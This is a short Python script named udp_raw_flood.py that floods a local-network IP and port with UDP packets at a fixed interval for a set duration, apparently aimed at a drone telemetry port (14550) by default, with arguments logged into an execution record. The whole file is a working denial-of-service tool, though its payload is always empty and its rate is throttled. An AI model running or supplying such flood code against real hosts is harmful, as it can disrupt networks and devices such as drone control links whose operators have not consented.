# udp_raw_flood.py

import socket
import time
import sys

def udp_limited_flood(ip="192.168.13.14", port=14550, size=0, interval=0.05, duration=60, execution_record=None):
    if execution_record:
        execution_record["arguments"] = {
            "ip": ip,
            "port": port,
            "size": size,
            "interval": interval,
            "duration": duration
        }
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"" * size

    print(f"Flooding {ip}:{port} with {size}-byte packets every {interval}s...")
    end_time = time.time() + duration
    while time.time() < end_time:
        sock.sendto(payload, (ip, port))
        time.sleep(interval)

if __name__ == "__main__":
    

    udp_limited_flood("192.168.13.1", 50657)
